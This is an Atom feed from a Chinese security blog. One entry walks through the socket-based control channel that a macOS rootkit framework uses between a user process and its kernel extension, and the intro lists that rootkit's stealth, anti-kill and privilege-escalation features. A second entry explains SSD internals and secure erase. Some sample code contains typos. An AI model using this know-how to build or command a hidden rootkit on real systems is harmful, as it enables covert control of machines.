<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>4ch12dy</title>
  
  <subtitle>H31l0 OS w0r1d</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/"/>
  <updated>2017-08-10T10:34:57.000Z</updated>
  <id>https://github.com/4ch12dy/4ch12dy.github.io.git/</id>
  
  <author>
    <name>4ch12dy</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>一种用户层与kext内核扩展交互方式</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/%E4%B8%80%E7%A7%8D%E7%94%A8%E6%88%B7%E5%B1%82%E4%B8%8Ekext%E5%86%85%E6%A0%B8%E6%89%A9%E5%B1%95%E4%BA%A4%E4%BA%92%E6%96%B9%E5%BC%8F/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/10/一种用户层与kext内核扩展交互方式/一种用户层与kext内核扩展交互方式/</id>
    <published>2017-08-10T07:59:00.000Z</published>
    <updated>2017-08-10T10:34:57.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><blockquote><p>最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。<br>简单说下rootKit原理：<br>利用kext驻留在内核，完成实际的各种功能：<br><code>sys_ptrace</code>过滤 <code>PT_DENY_ATTACH</code>反调试<br>hook系统调用防止<code>sys_kil</code>（很强大有木有）<br>隐藏自身进程，文件监控，网络监控，提权等等<br>可谓是相当可怕。这些功能都可以通过一个用户进程来控制，所以这里必须有一种机制来提供kext与用户层的交互方式，这就是本文重点。</p></blockquote></blockquote><h3 id="0x01-一个例子进入kext开发"><a href="#0x01-一个例子进入kext开发" class="headerlink" title="0x01 一个例子进入kext开发"></a>0x01 一个例子进入kext开发</h3><p>在这之前，简单的用一个例子来学习下kext开发。下面关于xcode中的操作都很明显，故忽略。</p><p>打开xcode创建一个Generic Kernel Extension工程，完成之后会出现一个kext模板，如下</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libkern/libkern.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> TestExtension_stop(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *d);</div><div class="line"><span class="keyword">kern_return_t</span> TestExtension_start(<span class="keyword">kmod_info_t</span> * ki, <span class="keyword">void</span> *d)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"hello kext!\n"</span>);</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div><div class="line"><span class="keyword">kern_return_t</span> TestExtension_stop(<span class="keyword">kmod_info_t</span> *ki, <span class="keyword">void</span> *d)</div><div class="line">&#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"bye kext!\n"</span>);</div><div class="line">    <span class="keyword">return</span> KERN_SUCCESS;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>其中这两个函数分别在内核扩展加载和卸载时调用，比如上面我们只是打印一行hello kext，这句话就会在这个kext加载是打印出来（在系统日志中查看）你可能会有疑惑，系统如何知道是这两个函数的，这个是在工程中设置的，你可以改变成任何函数都是OK的。</p><p>简单编译一下，然后找到编译后的kext文件，输入命令改变权限</p><p><code>sudo chown -R root:wheel TestExtension.kext</code></p><p>再输入  </p><p><code>sudo kextload TestExtension.kext</code></p><p>加载内核扩展，如果一切没错的话，这时你在系统日志中就会出现hello kext这句话。同理你可以输入下面的命令</p><p><code>sudo kextunload TestExtension.kext</code></p><p>来卸载该内核扩展，你同样会看到bye kext这句话。</p><h3 id="0x02-用户层与内和扩展间的交互"><a href="#0x02-用户层与内和扩展间的交互" class="headerlink" title="0x02 用户层与内和扩展间的交互"></a>0x02 用户层与内和扩展间的交互</h3><p>下面要介绍的是一种类似于socket机制的交互机制，通常kext在加载的时候会建立一个socket服务器，然后用户层程序去打开这个socket（使用<code>PF_SYSTEM</code>协议）。接下来kext就会处理来至用户端的命令。下面同样通过一个例子来表明他们之间的交互，这里分为kext和客户端两部分。</p><h4 id="kext-示例代码"><a href="#kext-示例代码" class="headerlink" title="kext 示例代码"></a>kext 示例代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/systm.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/mach_types.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mach/kern_return.h&gt;</span> </span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/kern_control.h&gt;</span></span></div><div class="line"><span class="comment">//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">char</span> name[] = <span class="string">"com.example.mymodule"</span> ;<span class="comment">//标识这个kext</span></div><div class="line"><span class="keyword">struct</span> kern_ctl_ref _ctlref ; </div><div class="line"></div><div class="line"><span class="keyword">kern_return_t</span> start(<span class="keyword">kmod_info_t</span> *info, <span class="keyword">void</span> *data)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> err ;</div><div class="line"></div><div class="line"><span class="keyword">struct</span> kern_ctl_reg ctlreg ;</div><div class="line">bzero(&amp;ctlreg, <span class="keyword">sizeof</span>(ctlreg)) ;</div><div class="line"></div><div class="line"><span class="comment">//控制信息</span></div><div class="line">ctlreg.ctl_id = <span class="number">0</span> ; <span class="comment">/* 请求分配一个动态id */</span></div><div class="line">ctlreg.ctl_unit = <span class="number">0</span> ;</div><div class="line"><span class="built_in">strncpy</span>(ctlreg.ctl_name, name, <span class="keyword">sizeof</span>(ctlreg.ctl_name));</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">//回调函数</span></div><div class="line">ctlreg.ctl_connect_func = connect ;</div><div class="line">ctlreg.ctl_disconnect_func = disconnect ;</div><div class="line">ctlreg.ctl_send_func = send ;</div><div class="line">ctlreg.ctl_getopt_func = getopt ;</div><div class="line">ctlreg.ctl_setopt_func = setopt ;</div><div class="line"></div><div class="line"><span class="comment">//注册内核控制</span></div><div class="line">err = ctl_register(&amp;ctlreg, &amp;_ctlref) ;</div><div class="line"><span class="keyword">if</span> (err) <span class="keyword">return</span> KERN_FAILURE ;</div><div class="line"></div><div class="line"><span class="keyword">return</span> KERN_SUCCESS ;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>下面解释下其中的<code>kern_ctl_ref</code>数据结构</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> kern_ctl_reg</div><div class="line">&#123;</div><div class="line"><span class="comment">/* 控制信息 */</span></div><div class="line"><span class="keyword">char</span>ctl_name[MAX_KCTL_NAME];</div><div class="line"><span class="keyword">u_int32_t</span>ctl_id;</div><div class="line"><span class="keyword">u_int32_t</span>ctl_unit;</div><div class="line"></div><div class="line">    <span class="comment">/* 控制设置 */</span></div><div class="line">    <span class="keyword">u_int32_t</span>ctl_flags;</div><div class="line">    <span class="keyword">u_int32_t</span>ctl_sendsize;</div><div class="line">    <span class="keyword">u_int32_t</span>ctl_recvsize;</div><div class="line"></div><div class="line">    <span class="comment">/* 回调函数 */</span></div><div class="line">    ctl_connect_func    ctl_connect;<span class="comment">//建立连接时调用</span></div><div class="line">    ctl_disconnect_func    ctl_disconnect;<span class="comment">//断开连接时调用</span></div><div class="line">    ctl_send_func    ctl_send;<span class="comment">//处理从client到kernel的数据发送</span></div><div class="line">    ctl_setopt_func    ctl_setopt; <span class="comment">//当client调用setsockopt时调用</span></div><div class="line">    ctl_getopt_func    ctl_getopt;<span class="comment">//当client调用getsockopt时调用</span></div><div class="line">&#125;;</div></pre></td></tr></table></figure><h4 id="client-示例代码"><a href="#client-示例代码" class="headerlink" title="client 示例代码"></a>client 示例代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/kern_control.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">char</span> name[] = <span class="string">"com.example.mymodule"</span> ;<span class="comment">//标识这个kext</span></div><div class="line"><span class="keyword">static</span> <span class="keyword">int</span> g_socket = <span class="number">-1</span>;</div><div class="line"><span class="keyword">u_int32_t</span> getctlidbybame(<span class="keyword">int</span> sock, <span class="keyword">char</span> *name) ;</div><div class="line"></div><div class="line"><span class="comment">//建立连接</span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket_ctl</span><span class="params">(<span class="keyword">char</span> *name)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ;</div><div class="line"><span class="keyword">if</span> (g_sock == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line"></div><div class="line"><span class="keyword">u_int32_t</span> id = getctlidbyname(g_sock, name) ;</div><div class="line"></div><div class="line">sockaddr_ctl addr ;</div><div class="line">addr.sc_len = <span class="keyword">sizeof</span>(addr) ;</div><div class="line">addr.sc_family = AF_SYSTEM ;</div><div class="line">addr.sc_sysaddr = AF_SYS_CONTROL ;</div><div class="line">addr.sc_id = id ;</div><div class="line">addr.sc_unit = <span class="number">0</span> ; <span class="comment">/* allocate dynamically */</span></div><div class="line"></div><div class="line"><span class="keyword">int</span> err ;</div><div class="line">err = connect(g_sock, (<span class="keyword">struct</span> sockaddr*)&amp;addr, <span class="keyword">sizeof</span>(addr)) ;</div><div class="line"><span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="number">0</span> ;</div><div class="line"></div><div class="line"><span class="keyword">return</span> sock ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">u_int32_t</span> getctlidbybame(<span class="keyword">int</span> sock, <span class="keyword">char</span> *name)</div><div class="line">&#123;</div><div class="line"><span class="keyword">struct</span> ctl_info info ;</div><div class="line"><span class="built_in">memset</span>(&amp;info, <span class="number">0</span>, <span class="keyword">sizeof</span>(info)) ;</div><div class="line"><span class="built_in">strncpy</span>(info.ctl_name, name, <span class="built_in">strlen</span>(name)) ;</div><div class="line"><span class="keyword">int</span> err = ioctl(sock, CTLIOCGINGO, &amp;info) ;</div><div class="line"><span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="number">0</span> ; <span class="comment">/* should do something stronger here! */</span></div><div class="line"><span class="keyword">return</span> info.ctl_id ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span></div><div class="line">&#123;</div><div class="line">socket_ctl(name);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//发送数据</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">execute_cmd</span><span class="params">(<span class="keyword">int</span> cmd, <span class="keyword">char</span> *args)</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> data[<span class="number">32</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="keyword">size_t</span> data_len = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> retv;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(args != <span class="literal">NULL</span>) &#123;</div><div class="line"><span class="built_in">memcpy</span>(data, args, <span class="built_in">strlen</span>(args));</div><div class="line">&#125;</div><div class="line"></div><div class="line">data_len = <span class="built_in">strlen</span>(data) + <span class="number">1</span>;</div><div class="line"></div><div class="line">retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (<span class="keyword">void</span> *)data, (<span class="keyword">socklen_t</span>)data_len);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(retv != <span class="number">0</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[ERROR] Kernel command execution failed:\n"</span>);</div><div class="line"><span class="built_in">printf</span>(<span class="string">"\t%s (%d)\n"</span>, strerror(errno), errno);</div><div class="line"></div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="comment">//接收数据</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_data</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"><span class="keyword">char</span> *data = <span class="built_in">malloc</span>(<span class="number">32</span>);</div><div class="line"></div><div class="line"><span class="keyword">socklen_t</span> data_len = <span class="number">32</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> retv = getsockopt(g_socket, SYSPROTO_CONTROL, <span class="number">0</span>, data, &amp;data_len);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(retv != <span class="number">0</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[ERROR] getsockopt()\n"</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">size_t</span> r = recv(g_socket, data, data_len, <span class="number">0</span>);</div><div class="line"></div><div class="line"><span class="keyword">if</span>(r == <span class="number">0</span>) &#123;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[ERROR] recv()\n"</span>);</div><div class="line"></div><div class="line"><span class="keyword">return</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续…</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><ul><li><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">http://www.tanhao.me/pieces/1515.html/</a></li><li><a href="https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html" target="_blank" rel="external">https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html</a></li><li><a href="https://github.com/enzolovesbacon/inficere">https://github.com/enzolovesbacon/inficere</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。&lt;br&gt;简单说下rootKit原理：&lt;br&gt;利用kext驻留在内核，完成实际的各种功能：&lt;br&gt;&lt;code&gt;sys
      
    
    </summary>
    
      <category term="kext/iokit" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/kext-iokit/"/>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>浅谈SSD与安全擦除</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/08/%E6%B5%85%E8%B0%88SSD%E4%B8%8E%E5%AE%89%E5%85%A8%E6%93%A6%E9%99%A4/SSD%E4%B8%8E%E5%AE%89%E5%85%A8%E6%93%A6%E9%99%A4/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/08/浅谈SSD与安全擦除/SSD与安全擦除/</id>
    <published>2017-08-08T06:27:59.000Z</published>
    <updated>2017-08-08T06:40:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSD与安全擦除"><a href="#SSD与安全擦除" class="headerlink" title="SSD与安全擦除"></a>SSD与安全擦除</h2><blockquote><blockquote><p>目录<br>0x01 SSD简介<br>0x02 SSD安全擦除原理及工具<br>0x03 参考</p></blockquote></blockquote><h3 id="0x01-SSD简介"><a href="#0x01-SSD简介" class="headerlink" title="0x01 SSD简介"></a>0x01 SSD简介</h3><h4 id="1-1-SSD的组成结构"><a href="#1-1-SSD的组成结构" class="headerlink" title="1.1    SSD的组成结构"></a>1.1    SSD的组成结构</h4><p>SSD 的关键部件由控制器和存储单元两部分组成。除此之外，还有缓存和主机接口。</p><h5 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h5><p>每个 SSD 都有一个控制器(controller)将存储单元连接到电脑。控制器是一个执行固件(firmware)代码的嵌入式处理器。主要功能如下：</p><ul><li>错误检查和纠正(ECC)</li><li>磨损平衡(Wear leveling)</li><li>坏块映射(Bad block mapping)</li><li>read disturb(读取某个块的数据的时候会影响到相邻块的数据)管理</li><li>缓存控制</li><li>垃圾回收</li><li>加密</li></ul><h5 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h5><p>SSD固态硬盘，存储介质和机械硬盘完全不同，其依靠三极管的充放电实现，而非磁场。<br>目前，介质主要有三种：SLC，MLC和TLC</p><ul><li>SLC=Single-LevelCell，即1bit/cell，速度快寿命长，价格超贵（约MLC3倍以上的价格），约10万次擦写寿命 </li><li>MLC=Multi-LevelCell，即2bit/cell，速度一般寿命一般，价格一般，约3000—10000次擦写寿命 </li><li>TLC=Trinary-LevelCell，即3bit/cell，也有Flash厂家叫8LC，速度慢寿命短，价格便宜，约500次擦写寿命。</li></ul><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/smt.jpg?raw=true" alt="0-1"></p><p>每cell可存储的比特位表示了存储的能力，可以看出TLC的每cell存储能力最强，一个cell可以存储3比特，但相对的，TLC的寿命最短，即可擦写次数最少。当擦写次数达到寿命值时，读写数据将不再有效，具体的寿命可以参考具体闪存颗粒数据手册。</p><p>在机械硬盘上，由于机械硬盘的数据可以直接覆盖，所以LBA和PBA(Physical Block Address)的关系是1:1对应，不会变更，即LBA=PBA。但在SSD上，这种关系就变得复杂了，原因是SSD使用的存储介质NAND闪存有需要先擦除才能再写入，因为读写以页为单位，擦除以块（多个页组成）为单位的特性，导致LBA和PBA的关系不再是固定不变的。<br>NAND闪存的擦除/写入关系请参考下图：</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/0-0.png?raw=true" alt="0-0"></p><h5 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h5><p>基于 NAND 闪存的 SSD 通常带有一个基于 DRAM 的缓存，其作用与普通的机械式硬盘类似，但是还会存储一些诸如 Wear leveling 数据之类的其他数据。把数据先缓存在 DRAM 中，然后集中写入，从而减少写入次数。特例之一是 SandForce 生产的控制器，它并不含有缓存，但是性能依旧很出色，由于其结构简单，故而可以生产体积更小的 SSD，并且掉电时数据更安全。</p><h5 id="主机接口"><a href="#主机接口" class="headerlink" title="主机接口"></a>主机接口</h5><p>主机接口与控制器紧密相关，但是通常与传统的机械式硬盘相差不大，主要有以下几种：</p><ul><li>SATA</li><li>SAS</li><li>PCI-E</li><li>Fibre Channel</li><li>USB</li></ul><p>主机接口的速度限制了 SSD 所能达到的速度峰值。但是一般这并不是瓶颈所在。</p><h4 id="1-2-SSD-技术解析"><a href="#1-2-SSD-技术解析" class="headerlink" title="1.2 SSD 技术解析"></a>1.2 SSD 技术解析</h4><h5 id="FTL（Flash-translation-layer）"><a href="#FTL（Flash-translation-layer）" class="headerlink" title="FTL（Flash translation layer）"></a>FTL（Flash translation layer）</h5><p>前面说过，闪存的读写单位为页，而页的大小一般为4KB或8KB，但我们的操作系统读写数据是按机械硬盘的扇区尺寸进行的（512Byte），更麻烦的是闪存擦除以块作单位，而且未擦除就无法写入，这导致操作系统现在使用的文件系统根本无法管理SSD，需要更换更先进、复杂的文件去解决这个问题，但这样就会加重操作系统的负担。 </p><p>为了不加重操作系统的负担，SSD采用软件的方式把闪存的操作虚拟成磁盘的独立扇区操作，这就是FTL。因FTL存在于文件系统和物理介质（闪存）之间，操作系统只需跟原来一样操作LBA即可，而LBA到PBA的所有转换工作，就全交由FTL负责。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/0-1.png?raw=true" alt="0-1"></p><p>FTL算法，其实就是一种LBA到PBA的映射。当文件系统发送指令要写入或者更新一个特定的逻辑页时，FTL实际上是把数据写入到一个不同的空闲物理页并更新映射表（LBA和PBA的关联数据），并把这个页上包含的“旧数据”标记为“无效”（更新后的数据已经写入新的PBA，旧地址的数据自然就失效了）。正是因为FTL的存在，操作系统才能把SSD当成HDD那样操作，因此FTL转换的性能也就直接影响SSD的性能表现。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/0-2.png?raw=true" alt="0-2"></p><p>我们现在看上图，假设在page0上写入数据(物理地址n）,接下来写入数据到page1(物理地址n+1)。接着page0数据被更新，但是更新后的数据并不是覆盖上去，FTL会把它写入到地址(n+2)上，然后标记(地址n)为“无效”。经过多次这样的操作后，这个块上就会装满了许多“有效”及“无效”的数据。如果要再次写入到这个块，就需要先擦除整个块的数据，当然就需要先把所有“有效”的数据复制到另外的空白块上再进行擦除。这样的操作就是GC（Garbagecollection）垃圾回收。</p><h4 id="WL（Wear-leveling）磨损平衡"><a href="#WL（Wear-leveling）磨损平衡" class="headerlink" title="WL（Wear leveling）磨损平衡"></a>WL（Wear leveling）磨损平衡</h4><p>简单说来，磨损平衡是确保闪存的每个块被写入的次数相等的一种机制。</p><p>通常情况下，在 NAND 块里的数据更新频度是不同的：有些会经常更新，有些则不常更新。很明显，那些经常更新的数据所占用的块会被快速的磨损掉，而不常更新的数据占用的块磨损就小得多。为了解决这个问题，需要让每个块的编程(擦写)次数尽可能保持一致：这就是需要对每个页的读取/编程操作进行监测，在最乐观的情况下，这个技术会让全盘的颗粒物理磨损程度相同并同时报废。</p><p>磨损平衡算法分静态和动态。动态磨损算法是基本的磨损算法：只有用户在使用中更新的文件占用的物理页地址被磨损平衡了。而静态磨损算法是更高级的磨损算法：在动态磨损算法的基础上，增加了对于那些不常更新的文件占用的物理地址进行磨损平衡，这才算是真正的全盘磨损平衡。简单点说来，动态算法就是每次都挑最年轻的 NAND 块来用，老的 NAND 块尽量不用。静态算法就是把长期没有修改的老数据从一个年轻 NAND 块里面搬出来，重新找个最老的 NAND 块放着，这样年轻的 NAND 块就能再度进入经常使用区。概念很简单，但实现却非常的复杂，特别是静态。</p><p>尽管磨损均衡的目的是避免数据重复在某个空间写入，以保证各个存储区域内磨损程度基本一致，从而达到延长固态硬盘的目的。但是，它对固态硬盘的性能有不利影响。</p><h4 id="GC（Garbagecollection）垃圾回收"><a href="#GC（Garbagecollection）垃圾回收" class="headerlink" title="GC（Garbagecollection）垃圾回收"></a>GC（Garbagecollection）垃圾回收</h4><p>所谓GC就是把一个闪存块里的‘有效’页数据复制到一个‘空白’块里，然后把这个块完全擦除。GC是SSD里的一个非常关键的操作，其效率对性能有决定性影响。闪存块里‘有效’页的数量对GC效率有决定性的影响，因数量越少，需要复制的页就越少， 花费的时间也越少，效率就高了。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/gc_1.jpg?raw=true" alt="0-2"></p><p>下图是把X块和Y块里的“有效”页复制到N块里，然后擦除X和Y以作备用的“空白块”</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/gc_2.png?raw=true" alt="0-2"></p><p>有三种垃圾回收策略：</p><ul><li>闲置垃圾回收：很明显在进行垃圾回收时候会消耗大量的主控处理能力和带宽造成处理用户请求的性能下降，SSD 主控制器可以设置在系统闲置时候做“预先”垃圾回收(提前做垃圾回收操作)，保证一定数量的”备用空白块”，让 SSD 在运行时候能够保持较高的性能。闲置垃圾回收的缺点是会增加额外的”写入放大”，因为你刚刚垃圾回收的”有效数据”，也许马上就会被更新后的数据替代而变成”无效数据”，这样就造成之前的垃圾回收做无用功了。</li><li>被动垃圾回收：每个 SSD 都支持的技术，但是对主控制器的性能提出了很高的要求，适合在服务器里用到，SandForce 的主控就属这类。在垃圾回收操作消耗带宽和处理能力的同时处理用户操作数据，如果没有足够强劲的主控制器性能则会造成明显的速度下降。这就是为啥很多 SSD 在全盘写满一次后会出现性能下降的道理，因为要想继续写入数据就必须要边垃圾回收边做写入。</li><li>手动垃圾回收：用户自己手动选择合适的时机运行垃圾回收软件，执行垃圾回收操作。</li></ul><p>可以想象，如果系统经常进行垃圾回收处理，频繁的将一些区块进行擦除操作，那么 SSD 的寿命反而也会进一步下降。由此把握这个垃圾回收的频繁程度，同时确保 SSD 中的闪存芯片拥有更高的使用寿命，这确实需要找到一个完美的平衡点。所以，SSD 必须要支持 Trim 技术，不然 GC 就显不出他的优势了。</p><h4 id="Trim"><a href="#Trim" class="headerlink" title="Trim"></a>Trim</h4><p>Trim 是一个 ATA 指令，当操作系统删除文件或格式化的时候，由操作系统同时把这个文件地址发送给 SSD 的主控制器，让主控制器知道这个地址的数据无效了。</p><p>当你删除一个文件的时候，文件系统其实并不会真正去删除它，而只是把这个文件地址标记为“已删除”，可以被再次使用，这意味着这个文件占的地址已经是“无效”的了。这就会带来一个问题，硬盘并不知道操作系统把这个地址标记为“已删除”了，机械盘的话无所谓，因为可以直接在这个地址上重新覆盖写入，但是到了 SSD 上问题就来了。NAND 需要先擦除才能再次写入数据，要得到空闲的 NAND 空间，SSD 必须复制所有的有效页到新的空闲块里，并擦除旧块(垃圾回收)。如果没有 Trim 指令，意味着 SSD 主控制器不知道这个页是“无效”的，除非再次被操作系统要求覆盖上去。</p><p>Trim 只是条指令，让操作系统告诉 SSD 主控制器这个页已经“无效”了。Trim 会减少写入放大，因为主控制器不需要复制“无效”的页(没 Trim 就是“有效”的)到空白块里，这同时代表复制的“有效”页变少了，垃圾回收的效率和 SSD 性能也提升了。</p><p>Trim 能大量减少伪有效页的数量，它能大大提升垃圾回收的效率。</p><p>目前，支持 Trim 需要三个要素，缺一不可：</p><ul><li>系统： 操作系统必须会发送 Trim 指令，Win7, Win2008R2 